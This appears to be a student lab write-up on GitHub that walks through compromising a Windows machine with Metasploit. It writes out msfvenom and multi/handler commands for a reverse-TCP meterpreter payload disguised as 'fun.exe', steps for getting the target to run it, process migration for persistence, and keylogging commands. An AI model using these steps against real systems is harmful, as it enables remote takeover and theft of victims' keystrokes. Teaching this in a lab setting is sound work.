# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="876" height="434" alt="image" src="https://github.com/user-attachments/assets/a8ff0935-9f9c-41fd-afe4-cb25add10a33" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="602" height="102" alt="image" src="https://github.com/user-attachments/assets/c5d2cd62-c645-467a-a561-90dd833c5b44" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="234" height="63" alt="image" src="https://github.com/user-attachments/assets/873e4c92-c87e-4b9b-8ac2-fe5b90c20319" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="242" height="43" alt="image" src="https://github.com/user-attachments/assets/19041c9e-6c65-4bc0-8e1c-c89674e67fcf" />


Check the status of apache2
## OUTPUT:
<img width="875" height="327" alt="image" src="https://github.com/user-attachments/assets/e5c1fc91-cff1-462f-a863-1d7664e3a1f2" />



Invoke msfconsole:
## OUTPUT:

<img width="1068" height="655" alt="image" src="https://github.com/user-attachments/assets/c7929120-c6ad-4394-acf3-e093a3e40129" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="1022" height="618" alt="image" src="https://github.com/user-attachments/assets/3e47ee7e-9e11-40df-94ef-a815b992b246" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1029" height="519" alt="image" src="https://github.com/user-attachments/assets/fee7b22b-62a0-44d1-996c-ba43e43cb652" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="1037" height="271" alt="image" src="https://github.com/user-attachments/assets/b7e1348f-4d3e-40ad-80f2-82e0450053e4" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="119" height="108" alt="image" src="https://github.com/user-attachments/assets/ca762a50-3ac4-40c1-9841-09fa0245ac43" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="745" height="251" alt="image" src="https://github.com/user-attachments/assets/bdd41bf5-e44c-4404-b666-197ce448d032" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="932" height="477" alt="image" src="https://github.com/user-attachments/assets/7f3baa69-2b48-4477-af6d-951d93bde575" />

<img width="905" height="44" alt="image" src="https://github.com/user-attachments/assets/c6621951-be73-4d4f-8b4a-b8b6b400a001" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="314" height="105" alt="image" src="https://github.com/user-attachments/assets/f7b712b8-891b-4c33-978f-9fcbc616bc7c" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="839" height="346" alt="image" src="https://github.com/user-attachments/assets/88e85f86-5257-47a8-bbf4-c837fc71e9cf" />
<img width="869" height="418" alt="image" src="https://github.com/user-attachments/assets/c1c235f7-dd08-4258-94a8-3639b7f2fb73" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="367" height="106" alt="image" src="https://github.com/user-attachments/assets/216d52c3-4ad6-4387-9ab9-6420b76248f7" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="485" height="325" alt="image" src="https://github.com/user-attachments/assets/c16247ee-d83e-418d-8222-c61e2a5c8513" />
<img width="322" height="153" alt="image" src="https://github.com/user-attachments/assets/6bed49a9-eacb-4edf-a749-5ff3144084b1" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
